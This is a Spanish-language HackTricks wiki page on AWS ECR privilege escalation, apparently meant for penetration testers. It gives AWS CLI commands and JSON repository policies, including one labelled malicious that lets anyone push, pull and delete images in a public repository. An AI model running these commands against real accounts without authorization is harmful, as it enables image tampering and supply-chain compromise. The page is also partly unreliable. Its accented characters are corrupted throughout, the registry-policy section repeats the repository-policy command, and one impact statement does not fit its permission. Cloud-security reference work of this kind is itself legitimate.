# AWS - Escalada de privilegios en ECR

<details>

<summary><strong>¬°Apoya a HackTricks y obt√©n beneficios!</strong></summary>

* Si quieres ver tu **empresa anunciada en HackTricks** o si quieres acceder a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop).
* Obt√©n el [**merchandising oficial de PEASS y HackTricks**](https://peass.creator-spring.com).
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family).
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) en GitHub.

</details>

## ECR

### `ecr:GetAuthorizationToken`,`ecr:BatchGetImage`

Un atacante con los permisos **`ecr:GetAuthorizationToken`** y **`ecr:BatchGetImage`** puede iniciar sesi√≥n en ECR y descargar im√°genes.

Para obtener m√°s informaci√≥n sobre c√≥mo descargar im√°genes:

{% content-ref url="../aws-post-exploitation/aws-ecr-post-exploitation.md" %}
[aws-ecr-post-exploitation.md](../aws-post-exploitation/aws-ecr-post-exploitation.md)
{% endcontent-ref %}

**Impacto potencial:** Escalada de privilegios indirecta al interceptar informaci√≥n sensible en el tr√°fico.

### `ecr:GetAuthorizationToken`,`ecr:BatchCheckLayerAvailability`,`ecr:CompleteLayerUpload`,`ecr:InitiateLayerUpload`,`ecr:PutImage`,`ecr:UploadLayerPart`

Un atacante con todos estos permisos **puede iniciar sesi√≥n en ECR y cargar im√°genes**. Esto puede ser √∫til para escalar privilegios en otros entornos donde se utilizan esas im√°genes.

Para aprender c√≥mo cargar una nueva imagen/actualizar una, consulta:

{% content-ref url="../aws-services/aws-eks-enum.md" %}
[aws-eks-enum.md](../aws-services/aws-eks-enum.md)
{% endcontent-ref %}

### `ecr-public:GetAuthorizationToken`, `ecr-public:BatchCheckLayerAvailability, ecr-public:CompleteLayerUpload`, `ecr-public:InitiateLayerUpload, ecr-public:PutImage`, `ecr-public:UploadLayerPart`

Similar a la secci√≥n anterior, pero para repositorios p√∫blicos.

### `ecr:SetRepositoryPolicy`

Un atacante con este permiso podr√≠a **cambiar** la **pol√≠tica del repositorio** para otorgarse a s√≠ mismo (o incluso a todos) **acceso de lectura/escritura**.\
Por ejemplo, en este ejemplo se otorga acceso de lectura a todos.
```bash
aws ecr set-repository-policy \
--repository-name <repo_name> \
--policy-text file://my-policy.json
```
Contenido de `my-policy.json`:
```json
{
"Version" : "2008-10-17",
"Statement" : [
{
"Sid" : "allow public pull",
"Effect" : "Allow",
"Principal" : "*",
"Action" : [
"ecr:BatchCheckLayerAvailability",
"ecr:BatchGetImage",
"ecr:GetDownloadUrlForLayer"
]
}
]
}
```
### `ecr-public:SetRepositoryPolicy`

Al igual que en la secci√≥n anterior, pero para repositorios p√∫blicos.\
Un atacante puede **modificar la pol√≠tica del repositorio** de un repositorio p√∫blico de ECR para otorgar acceso p√∫blico no autorizado o para escalar sus privilegios.
```bash
bashCopy code# Create a JSON file with the malicious public repository policy
echo '{
"Version": "2008-10-17",
"Statement": [
{
"Sid": "MaliciousPublicRepoPolicy",
"Effect": "Allow",
"Principal": "*",
"Action": [
"ecr-public:GetDownloadUrlForLayer",
"ecr-public:BatchGetImage",
"ecr-public:BatchCheckLayerAvailability",
"ecr-public:PutImage",
"ecr-public:InitiateLayerUpload",
"ecr-public:UploadLayerPart",
"ecr-public:CompleteLayerUpload",
"ecr-public:DeleteRepositoryPolicy"
]
}
]
}' > malicious_public_repo_policy.json

# Apply the malicious public repository policy to the ECR Public repository
aws ecr-public set-repository-policy --repository-name your-ecr-public-repo-name --policy-text file://malicious_public_repo_policy.json
```
**Impacto potencial**: Acceso p√∫blico no autorizado al repositorio p√∫blico de ECR, lo que permite a cualquier usuario cargar, descargar o eliminar im√°genes.

### `ecr:PutRegistryPolicy`

Un atacante con este permiso podr√≠a **cambiar** la **pol√≠tica del registro** para otorgarse a s√≠ mismo, a su cuenta (o incluso a todos) acceso de **lectura/escritura**.
```bash
aws ecr set-repository-policy \
--repository-name <repo_name> \
--policy-text file://my-policy.json
```
<details>

<summary><strong>¬°Apoya a HackTricks y obt√©n beneficios!</strong></summary>

* Si quieres ver tu **empresa anunciada en HackTricks** o si quieres acceder a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop).
* Obt√©n el [**merchandising oficial de PEASS y HackTricks**](https://peass.creator-spring.com).
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family).
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **s√≠gueme en** **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) en GitHub.

</details>
